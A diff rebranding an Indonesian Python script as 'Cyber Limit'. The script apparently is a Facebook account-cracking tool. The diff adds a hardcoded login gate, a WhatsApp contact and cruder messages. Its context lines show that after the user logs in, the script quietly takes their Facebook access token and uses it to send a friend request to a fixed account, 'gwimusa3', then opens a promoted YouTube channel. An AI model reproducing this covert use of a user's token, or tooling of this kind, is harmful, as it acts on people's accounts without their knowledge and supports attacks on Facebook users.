@@ -67,21 +67,21 @@ vuln = "\033[32mVuln"
 
 def siapa():
 	os.system('clear')
-	nama = raw_input("\033[1;97mSiapa nama kamu ? \033[1;91m: \033[1;92m")
+	nama = raw_input("\033[1;97mSiapa nama lu ? \033[1;91m: \033[1;92m")
 	if nama =="":
 		print"\033[1;96m[!] \033[1;91mIsi yang benar"
 		time.sleep(1)
 		siapa()
 	else:
 		os.system('clear')
-		jalan("\033[1;97mSelamat datang \033[1;92m" +nama+ "\n\033[1;97mTerimakasih telah menggunakan tools ini !!")
-		time.sleep(1)
+		jalan("\033[1;97mSelamat datang tools Cyber Limit \033[1;92m" +nama+ "\n\033[1;97mTerimakasih telah menggunakan tools ini !!")
+		time.sleep(3)
 		loginSC()
 		
 		
 def loginSC():
 	os.system('clear')
-	print"\033[1;97mSilahkan login SC nya dulu bosque\n"
+	print"\033[1;97mSilahkan login SC nya dulu bosque\n\tKalo ga tau wa aja(+12342050284)"
 	username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
 	if username =="wisnu" and password =="cyberlimit":
@@ -133,13 +133,13 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/omaliptv')
+				os.system('xdg-open https://www.youtube.com/Cyber Limit')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
 				keluar()
 		if 'checkpoint' in url:
-			print("\n\033[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint")
+			print("\n\033[1;96m[!] \x1b[1;91mAkun lu kena checkpoint bego\n\tJangan Salahin admin salahin akun lu\n\tKarna Make Ga Segampang Bikinnya")
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			keluar()
